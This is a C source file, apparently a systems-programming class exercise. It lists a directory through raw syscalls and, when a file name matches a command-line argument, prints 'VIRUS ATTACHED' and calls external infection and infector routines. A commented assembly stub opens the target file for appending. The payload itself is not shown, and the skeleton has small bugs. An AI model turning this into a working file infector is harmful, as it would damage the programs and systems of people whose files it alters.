#include "util.h"
#define _GNU_SOURCE
#include <dirent.h>
#include <fcntl.h>
#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define SYS_SEEK 19
#define SEEK_SET 0
#define SYS_GETDENTS 141
#define SHIRA_OFFSET 0x291
#define buff_SIZE 8192
void infection();
void infector(char*);

extern int system_call();

struct linux_dirent
{
	unsigned long d_ino;
	off_t d_off;
	unsigned short d_reclen;
	char d_name[];
};

int main (int argc , char* argv[], char* envp[])
{
    char name[1024];
    int fd;
	long len;
	char buff[buff_SIZE];
	struct linux_dirent *d;
    int i=1;
    while (i<argc){
        if (strncmp(argv[i],"-a", 2)==0) 
        {
            int j=2;
            while (j<strlen(argv[i])) {
                name[j-2]=argv[i][j];
                j++;
            }
        }
        i++;
    }
    fd = system_call(SYS_OPEN, ".", O_RDONLY | O_DIRECTORY, 0777);
	if (fd == -1) system_call(1, 0x55);
	len = system_call(SYS_GETDENTS, fd, buff, 8192);
	if (len == -1) system_call(1, 0x55);
	if (len == 0) system_call(1, 0x55);
    long counter=0;
    while (counter<len){
        d = (struct linux_dirent *)(buff + counter);
        system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
        if (strcmp(d->d_name, name)==0) {
            system_call(4,1," VIRUS ATTACHED ",18);
            infection();
            infector (name);
        }
        system_call(SYS_WRITE, STDOUT, " ", 1);
        counter += d->d_reclen;
    }
    return 0;
}
 /*infector:
push ebp
mov ebp, esp
;might need to substract
pushad
mov ebx, [ebp+8] ; Get first argument p
mov eax,5
mov ebx,ecx
mov ecx,2|8192
mov edx,0777
int 0x80
ret*/